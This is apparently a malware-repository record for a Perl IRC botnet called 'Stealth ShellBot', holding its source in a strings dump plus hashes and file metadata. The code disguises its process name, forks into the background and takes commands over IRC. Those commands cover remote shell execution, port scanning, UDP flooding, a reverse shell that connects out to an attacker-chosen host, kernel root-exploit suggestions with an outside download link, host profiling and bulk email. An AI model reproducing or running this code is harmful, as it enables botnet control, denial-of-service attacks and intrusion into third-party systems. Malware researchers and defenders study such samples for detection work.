$#_ == 1;\n   sendraw(\"INVITE $_[1] $_[0]\");\n}\nsub topico {\n   return unless $#_ == 1;\n   sendraw(\"TOPIC $_[0] $_[1]\");\n}\nsub topic { topico(@_); }\n\nsub whois {\n  sendraw(\"WHOIS $_[0]\");\n}\nsub who {\n  return unless $#_ == 0;\n  sendraw(\"WHO $_[0]\");\n}\nsub names {\n  return unless $#_ == 0;\n  sendraw(\"NAMES $_[0]\");\n}\nsub away {\n  sendraw(\"AWAY $_[0]\");\n}\nsub back { away(); }\nsub quit {\n  sendraw(\"QUIT :$_[0]\");\n  exit;\n}\n\n# DCC\npackage DCC;\n\nsub connections {\n   my @ready = $dcc_sel->can_read(1);\n#   return unless (@ready);\n   foreach my $fh (@ready) {\n     my $dcctipo = $DCC{$fh}{tipo};\n     my $arquivo = $DCC{$fh}{arquivo};\n     my $bytes = $DCC{$fh}{bytes};\n     my $cur_byte = $DCC{$fh}{curbyte};\n     my $nick = $DCC{$fh}{nick};\n\n     my $msg;\n     my $nread = sysread($fh, $msg, 10240);\n\n     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {\n        $DCC{$fh}{status} = \"Cancelado\";\n        $DCC{$fh}{ftime} = time;\n        $dcc_sel->remove($fh);\n        $fh->close;\n        next;\n     }\n\n     if ($dcctipo eq \"get\") {\n        $DCC{$fh}{curbyte} += length($msg);\n\n        my $cur_byte = $DCC{$fh}{curbyte};\n\n        open(FILE, \">> $arquivo\");\n        print FILE \"$msg\" if ($cur_byte <= $bytes);\n        close(FILE);\n\n        my $packbyte = pack(\"N\", $cur_byte);\n        print $fh \"$packbyte\";\n\n        if ($bytes == $cur_byte) {\n           $dcc_sel->remove($fh);\n           $fh->close;\n           $DCC{$fh}{status} = \"Recebido\";\n           $DCC{$fh}{ftime} = time;\n           next;\n        }\n     } elsif ($dcctipo eq \"send\") {\n          my $send = $fh->accept;\n          $send->autoflush(1);\n          $dcc_sel->add($send);\n          $dcc_sel->remove($fh);\n          $DCC{$send}{tipo} = 'sendcon';\n          $DCC{$send}{itime} = time;\n          $DCC{$send}{nick} = $nick;\n          $DCC{$send}{bytes} = $bytes;\n          $DCC{$send}{curbyte} = 0;\n          $DCC{$send}{arquivo} = $arquivo;\n          $DCC{$send}{ip} = $send->peerhost;\n          $DCC{$send}{porta} = $send->peerport;\n          $DCC{$send}{status} = \"Enviando\";\n\n          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon\n          open(FILE, \"< $arquivo\");\n          my $fbytes;\n          read(FILE, $fbytes, 1024);\n          print $send \"$fbytes\";\n          close FILE;\n#          delete($DCC{$fh});\n     } elsif ($dcctipo eq 'sendcon') {\n          my $bytes_sended = unpack(\"N\", $msg);\n          $DCC{$fh}{curbyte} = $bytes_sended;\n          if ($bytes_sended == $bytes) {\n             $fh->close;\n             $dcc_sel->remove($fh);\n             $DCC{$fh}{status} = \"Enviado\";\n             $DCC{$fh}{ftime} = time;\n             next;\n          }\n          open(SENDFILE, \"< $arquivo\");\n          seek(SENDFILE, $bytes_sended, 0);\n          my $send_bytes;\n          read(SENDFILE, $send_bytes, 1024);\n          print $fh \"$send_bytes\";\n          close(SENDFILE);\n     }\n   }\n}\n\n\nsub SEND {\n  my ($nick, $arquivo) = @_;\n  unless (-r \"$arquivo\") {\n    return(0);\n  }\n\n  my $dccark = $arquivo;\n  $dccark =~ s/[.*\\/](\\S+)/$1/;\n\n  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};\n  my $longip = unpack(\"N\",inet_aton($meuip));\n\n  my @filestat = stat($arquivo);\n  my $size_total=$filestat[7];\n  if ($size_total == 0) {\n     return(0);\n  }\n\n  my ($porta, $sendsock);\n  do {\n    $porta = int rand(64511);\n    $porta += 1024;\n    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);\n  } until $sendsock;\n\n  $DCC{$sendsock}{tipo} = 'send';\n  $DCC{$sendsock}{nick} = $nick;\n  $DCC{$sendsock}{bytes} = $size_total;\n  $DCC{$sendsock}{arquivo} = $arquivo;\n\n\n  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");\n\n}\n\nsub GET {\n  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;\n  return(0) if (-e \"$arquivo\");\n  if (open(FILE, \"> $arquivo\")) {\n     close FILE;\n  } else {\n    return(0);\n  }\n\n  my $dccip=fixaddr($dcclongip);\n  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);\n  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);\n  $dccsock->autoflush(1);\n  $dcc_sel->add($dccsock);\n  $DCC{$dccsock}{tipo} = 'get';\n  $DCC{$dccsock}{itime} = time;\n  $DCC{$dccsock}{nick} = $nick;\n  $DCC{$dccsock}{bytes} = $bytes;\n  $DCC{$dccsock}{curbyte} = 0;\n  $DCC{$dccsock}{arquivo} = $arquivo;\n  $DCC{$dccsock}{ip} = $dccip;\n  $DCC{$dccsock}{porta} = $dccporta;\n  $DCC{$dccsock}{status} = \"Recebendo\";\n}\n\n# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas\nsub Status {\n  my $socket = shift;\n  my $sock_tipo = $DCC{$socket}{tipo};\n  unless (lc($sock_tipo) eq \"chat\") {\n    my $nick = $DCC{$socket}{nick};\n    my $arquivo = $DCC{$socket}{arquivo};\n    my $itime = $DCC{$socket}{itime};\n    my $ftime = time;\n    my $status = $DCC{$socket}{status};\n    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});\n\n    my $d_time = $ftime-$itime;\n\n    my $cur_byte = $DCC{$socket}{curbyte};\n    my $bytes_total =  $DCC{$socket}{bytes};\n\n    my $rate = 0;\n    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;\n    my $porcen = ($cur_byte*100)/$bytes_total;\n\n    my ($r_duv, $p_duv);\n    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $r_duv = $3; $r_duv++ if $4 >= 5;\n       $rate = \"$1\\.$2\".\"$r_duv\";\n    }\n    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $p_duv = $3; $p_duv++ if $4 >= 5;\n       $porcen = \"$1\\.$2\".\"$p_duv\";\n    }\n    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");\n  }\n\n\n  return(0);\n}\n\n\n# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)\nsub fixaddr {\n    my ($address) = @_;\n\n    chomp $address;     # just in case, sigh.\n    if ($address =~ /^\\d+$/) {\n        return inet_ntoa(pack \"N\", $address);\n    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {\n        return $address;\n    } elsif ($address =~ tr/a-zA-Z//) {                    # Whee! Obfuscation!\n        return inet_ntoa(((gethostbyname($address))[4])[0]);\n    } else {\n        return;\n    }\n}"
    },
    "filename": "VirusShare_440e07a4a012cc1af38959f8923688b7",
    "filesize": 32783,
    "filetype": "a /usr/bin/perl script executable (binary data)",
    "hashes": {
        "md5": "440e07a4a012cc1af38959f8923688b7",
        "sha1": "a9b1bab9c6c659e3a142e8db9cfe204026775a06",
        "sha256": "f42d28021f148b5f66b768b19c474bea43fdb127541f23cf7753242b8e3329eb"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "########## CONFIGURACAO ############",
            "my @ps = (\"/usr/local/apache/bin/httpd -DSSL\",\"/sbin/syslogd\",\"[eth0]\",\"/sbin/klogd -c 1 -x -x\",\"/usr/sbin/acpid\",\"/usr/sbin/cron\",\"[bash]\");",
            "my $processo = $ps[rand scalar @ps];",
            "$servidor='irc.byroe.net' unless $servidor;",
            "my $porta='6667';",
            "my @canais=(\"#tEAmHaCk\");",
            "my @adms=(\"CaMaChO\");",
            "# Anti Flood ( 6/3 Recomendado )",
            "my $linas_max=10;",
            "my $sleep=5;",
            "my $nick = getnick();",
            "my $ircname = getident2();",
            "my $realname = \"",
            "6TeamHacK ",
            "8LaBoRaToRiuMz",
            "#chop (my $realname = `",
            "6TeamHacK ",
            "8LaBoRaToRiuMz",
            "my $acessoshell = 1;",
            "######## Stealth ShellBot ##########",
            "my $prefixo = \"!all\";",
            "my $estatisticas = 0;",
            "my $pacotes = 1;",
            "####################################",
            "my $VERSAO = '0.3b';",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\";",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Problema com o fork: $!\" unless defined($pid);",
            "my %irc_servers;",
            "my %DCC;",
            "my $dcc_sel = new IO::Select->new();",
            "#####################",
            "# Stealth Shellbot  #",
            "#####################",
            "sub getnick {",
            "  return \"KeRabot\".int(rand(03));",
            "sub getident2 {",
            "        my $length=shift;",
            "        $length = 3 if ($length < 3);",
            "        my @chars=('a'..'z','A'..'Z','1'..'9');",
            "        foreach (1..$length)",
            "        {",
            "                $randomstring.=$chars[rand @chars];",
            "        }",
            "        return $randomstring;",
            "#############################",
            "#  B0tchZ na veia ehehe :P  #",
            "#############################",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "  if ($#_ == '1') {",
            "    my $socket = $_[0];",
            "    print $socket \"$_[1]\\n\";",
            "  } else {",
            "      print $IRC_cur_socket \"$_[0]\\n\";",
            "sub conectar {",
            "   my $meunick = $_[0];",
            "   my $servidor_con = $_[1];",
            "   my $porta_con = $_[2];",
            "   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);",
            "   if (defined($IRC_socket)) {",
            "     $IRC_cur_socket = $IRC_socket;",
            "     $IRC_socket->autoflush(1);",
            "     $sel_cliente->add($IRC_socket);",
            "     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "     nick(\"$meunick\");",
            "     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "     print \"\\nShellBot $VERSAO by: tEAmHaCk\\n\";",
            "     print \"nick: $nick\\n\";",
            "     print \"servidor: $servidor\\n\\n\";",
            "     sleep 2;",
            "   }",
            "my $line_temp;",
            "while( 1 ) {",
            "   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
            "   delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "   &DCC::connections;",
            "   my @ready = $sel_cliente->can_read(0.6);",
            "   next unless(@ready);",
            "   foreach $fh (@ready) {",
            "     $IRC_cur_socket = $fh;",
            "     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "     $nread = sysread($fh, $msg, 4096);",
            "     if ($nread == 0) {",
            "        $sel_cliente->remove($fh);",
            "        $fh->close;",
            "        delete($irc_servers{$fh});",
            "     }",
            "     @lines = split (/\\n/, $msg);",
            "     for(my $c=0; $c<= $#lines; $c++) {",
            "       $line = $lines[$c];",
            "       $line=$line_temp.$line if ($line_temp);",
            "       $line_temp='';",
            "       $line =~ s/\\r$//;",
            "       unless ($c == $#lines) {",
            "         parse(\"$line\");",
            "       } else {",
            "           if ($#lines == 0) {",
            "             parse(\"$line\");",
            "           } elsif ($lines[$c] =~ /\\r$/) {",
            "               parse(\"$line\");",
            "           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "               parse(\"$line\");",
            "           } else {",
            "               $line_temp = $line;",
            "           }",
            "       }",
            "      }",
            "   }",
            "sub parse {",
            "   my $servarg = shift;",
            "   if ($servarg =~ /^PING \\:(.*)/) {",
            "     sendraw(\"PONG :$1\");",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "       my $pn=$1; my $onde = $4; my $args = $5;",
            "       if ($args =~ /^\\001VERSION\\001$/) {",
            "         notice(\"$pn\", \"\\001VERSION mIRC v6.16 Khaled Mardam-Bey\\001\");",
            "       }",
            "       elsif ($args =~ /^\\001PING\\s+(\\d+)\\001$/) {",
            "         notice(\"$pn\", \"\\001PONG\\001\");",
            "       }",
            "       elsif (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {",
            "         if ($onde eq \"$meunick\"){",
            "           shell(\"$pn\", \"$args\");",
            "         }",
            "         elsif ($args =~ /^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/ ) {",
            "            my $natrix = $1;",
            "            my $arg = $2;",
            "            if ($arg =~ /^\\!(.*)/) {",
            "              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"$prefixo\" and $arg =~ /^\\!nick/);",
            "            } elsif ($arg =~ /^\\@(.*)/) {",
            "                $ondep = $onde;",
            "                $ondep = $pn if $onde eq $meunick;",
            "                bfunc(\"$ondep\",\"$1\");",
            "            } else {",
            "                shell(\"$onde\", \"$arg\");",
            "            }",
            "         }",
            "       }",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "       if (lc($1) eq lc($meunick)) {",
            "         $meunick=$4;",
            "         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       }",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "       $meunick = getnick();",
            "       nick(\"$meunick\");",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "       $meunick = $2;",
            "       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "       foreach my $canal (@canais) {",
            "         sendraw(\"JOIN $canal\");",
            "       }",
            "   }",
            "sub bfunc {",
            "  my $printl = $_[0];",
            "  my $funcarg = $_[1];",
            "  if (my $pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           if ($funcarg =~ /^portscan (.*)/) {",
            "             my $hostip=\"$1\";",
            "             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"59\",\"79\",\"80\",\"110\",\"113\",\"135\",\"139\",\"443\",\"445\",\"1025\",\"5000\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"8080\",\"8018\");",
            "             my (@aberta, %porta_banner);",
            "             foreach my $porta (@portas)  {",
            "                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);",
            "                if ($scansock) {",
            "                   push (@aberta, $porta);",
            "                   $scansock->close;",
            "                }",
            "             }",
            "             if (@aberta) {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @aberta\");",
            "             } else {",
            "                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");",
            "             }",
            "           }",
            "           #elsif ($funcarg =~ /^download\\s+(.*)\\s+(.*)/) {",
            "           # getstore(\"$1\", \"$2\");",
            "           # sendraw($IRC_cur_socket, \"PRIVMSG $printl :Download de $2 ($1) Concludo!\");",
            "           # }",
            "           elsif ($funcarg =~ /^fullportscan\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "             my $hostname=\"$1\";",
            "             my $portainicial = \"$2\";",
            "             my $portafinal = \"$3\";",
            "             my (@abertas, %porta_banner);",
            "             foreach my $porta ($portainicial..$portafinal)",
            "             {",
            "               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => 4);",
            "               if ($scansock) {",
            "                 push (@abertas, $porta);",
            "                 $scansock->close;",
            "                 sendraw($IRC_cur_socket, \"PRIVMSG $printl :Porta $porta aberta em $hostname\");",
            "               }",
            "             }",
            "             if (@abertas) {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @abertas\");",
            "             } else {",
            "               sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");",
            "             }",
            "            }",
            "            # Duas Verses simplificada do meu Tr0x ;D",
            "            elsif ($funcarg =~ /^udp\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "              return unless $pacotes;",
            "              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);",
            "              my $alvo=inet_aton(\"$1\");",
            "              my $porta = \"$2\";",
            "              my $tempo = \"$3\";",
            "\t      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002pacotando\\002: $1 \\002tempo\\002: $tempo\");",
            "              my $pacote;",
            "              my $pacotese;",
            "              my $fim = time + $tempo;",
            "              my $pacota = 1;",
            "              while (($pacota == \"1\")) {",
            "                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));",
            "                $pacote=$rand x $rand x $rand;",
            "                $porta = int(rand 65000) +1 if ($porta == \"0\");",
            "                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++;",
            "              }",
            "               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");",
            "               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002pacotado\\002: $1 \\002tempo\\002: $tempo\".\"segs \\002pacotes\\002: $pacotese\");",
            "            }",
            "            elsif ($funcarg =~ /^udpfaixa\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "              sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002aviso\\002: \\@udpfaixa foi removido do bot\");",
            "\t      exit;",
            "              return unless $pacotes;",
            "              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);",
            "              my $faixaip=\"$1\";",
            "              my $porta = \"$2\";",
            "              my $tempo = \"$3\";",
            "\t     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Pacotando\\002: $1 \\002tempo\\002: $tempo\");",
            "              my $pacote;",
            "              my $pacotes;",
            "              my $fim = time + $tempo;",
            "              my $pacota = 1;",
            "              my $alvo;",
            "              while ($pacota == \"1\") {",
            "                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));",
            "                for (my $faixa = 1; $faixa <= 255; $faixa++) {",
            "                  $alvo = inet_aton(\"$faixaip.$faixa\");",
            "                  $pacote=$rand x $rand x $rand;",
            "                  $porta = int(rand 65000) +1 if ($porta == \"0\");",
            "                  send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++;",
            "                  if ($faixa >= 255) {",
            "                    $faixa = 1;",
            "                  }",
            "                }",
            "              }",
            "               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");",
            "               #sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002faixa\\002: $1\".\"1-\".\"$2\".\"255 \\002tempo\\002: $tempo\".\"segs \\002pacotes\\002: $pacotese\");",
            "            }",
            "            # Conback.pl by Dominus Vis adaptada e adicionado suporte pra windows ;p",
            "            elsif ($funcarg =~ /^conback\\s+(.*)\\s+(\\d+)/) {",
            "              my $host = \"$1\";",
            "              my $porta = \"$2\";",
            "              sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Conectando-se em\\002: $host:$porta\");",
            "              my $proto = getprotobyname('tcp');",
            "              my $iaddr = inet_aton($host);",
            "              my $paddr = sockaddr_in($porta, $iaddr);",
            "              my $shell = \"/bin/sh -i\";",
            "              if ($^O eq \"MSWin32\") {",
            "                $shell = \"cmd.exe\";",
            "              }",
            "              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";",
            "              connect(SOCKET, $paddr) or die \"connect: $!\";",
            "              open(STDIN, \">&SOCKET\");",
            "              open(STDOUT, \">&SOCKET\");",
            "              open(STDERR, \">&SOCKET\");",
            "              system(\"$shell\");",
            "              close(STDIN);",
            "              close(STDOUT);",
            "              close(STDERR);",
            "            }",
            "           elsif ($funcarg =~ /^oldpack\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "            return unless $pacotes;",
            "             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");",
            "             $dtime = 1 if $dtime == 0;",
            "             my %bytes;",
            "             $bytes{igmp} = $2 * $pacotes{igmp};",
            "             $bytes{icmp} = $2 * $pacotes{icmp};",
            "             $bytes{o} = $2 * $pacotes{o};",
            "             $bytes{udp} = $2 * $pacotes{udp};",
            "             $bytes{tcp} = $2 * $pacotes{tcp};",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status GERAL -\\002\");",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo\\002: $dtime\".\"s\");",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total pacotes\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Mdia de envio\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");",
            "           }",
            "           elsif ($funcarg =~ /^xpl\\s+(.*)/) {",
            "           my $kernel = \"$1\";",
            "           if ($kernel =~ /2.4.17/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: newlocal, kmod, uselib24\"); goto downloads; }",
            "           if ($kernel =~ /2.4.18/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: newlocal, kmod, brk, brk2\"); goto downloads; }",
            "           if ($kernel =~ /2.4.19/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: kmod, newlocal, w00t, brkm brk2\"); goto downloads; }",
            "           if ($kernel =~ /2.4.20/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: kmod, kmod2, newlocal, w00t, ptrace, ptrace-kmod, brk, brk2\"); goto downloads; }",
            "           if ($kernel =~ /2.4.21/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: brk, brk2, ptrace, ptrace-kmod, uselib24, elflbl\"); goto downloads; }",
            "           if ($kernel =~ /2.4.22/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: brk, brk2, ptrace, ptrace-kmod, uselib24, elflbl, mremap_pte, loginx\"); goto downloads; }",
            "           if ($kernel =~ /2.4.23/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl, mremap_pte\"); goto downloads; }",
            "           if ($kernel =~ /2.4.24/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl, mremap_pte\"); goto downloads; }",
            "           if ($kernel =~ /2.4.25/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }",
            "           if ($kernel =~ /2.4.26/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }",
            "           if ($kernel =~ /2.4.27/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }",
            "           if ($kernel =~ /2.4.28/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: uselib24, elflbl\"); goto downloads; }",
            "           if ($kernel =~ /2.6.0/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: wuftpd, h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.2/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: mremap_pte, krad, h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.5/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad, krad2, h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.6/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad, krad2, h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.7/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.8/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.9/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit, r00t\"); goto downloads; }",
            "           if ($kernel =~ /2.6.10/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: krad2, h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.11/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: h00lyshit, k-rad3\"); goto downloads; }",
            "           if ($kernel =~ /2.6.12/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: h00lyshit\"); goto downloads; }",
            "           if ($kernel =~ /2.6.13/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }",
            "           if ($kernel =~ /2.6.14/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }",
            "           if ($kernel =~ /2.6.15/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }",
            "           if ($kernel =~ /2.6.16/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }",
            "           if ($kernel =~ /2.6.17/) { sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: raptor, raptor2, h00lyshit, solpot, prctl\"); goto downloads; }",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : kernel $kernel rootab with: nothing =)\");",
            "           exit;",
            "           downloads:",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : downloads: ",
            "http://orangutan.or.id/xpl/\");",
            "           }",
            "           elsif ($funcarg =~ /^info/) {",
            "           my $sysos = `uname -sr`;",
            "           my $uptime = `uptime`;",
            "           if ( $sysos =~ /freebsd/i ) {",
            "           $sysname = `hostname`;",
            "           $memory = `expr \\`cat /var/run/dmesg.boot | grep \"real memory\" | cut -f5 -d\" \"\\` \\/ 1048576`;",
            "           $swap = `$toploc | grep -i swap | cut -f2 -d\" \" | cut -f1 -d\"M\"`;",
            "           chomp($memory);",
            "           chomp($swap);",
            "           }",
            "           elsif ( $sysos =~ /linux/i ) {",
            "           $sysname = `hostname -f`;",
            "           $memory = `free -m |grep -i mem | awk '{print \\$2}'`;",
            "           $swap = `free -m |grep -i swap | awk '{print \\$2}'`;",
            "           chomp($swap);",
            "           chomp($memory);",
            "           }",
            "           else {",
            "           $sysname =\"Not Found\";;",
            "           $memory =\"Not found\";",
            "           $swap =\"Not Found\";",
            "           }",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "15--- ",
            "01 SysInfo ",
            "15-------------\");",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "01os/host",
            "01 $sysos - $sysname \");",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "01proc/PID",
            "01 $processo - $$\");",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "01uptime",
            "01 $uptime\");",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "01memory/swap",
            "01 $memory - $swap\");",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "01perl/bot",
            "01 $] - $VERSAO\");",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "15--- ",
            "01 /SysInfo ",
            "15------------\");",
            "           }",
            "           elsif($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl : ",
            "01Enviando e-mail para: $3\");",
            "           $subject = $1;",
            "           $sender = $2;",
            "           $recipient = $3;",
            "           @corpo = $4;",
            "           $mailtype = \"content-type: text/html\";",
            "           $sendmail = '/usr/sbin/sendmail';",
            "           open (SENDMAIL, \"| $sendmail -t\");",
            "           print SENDMAIL \"$mailtype\\n\";",
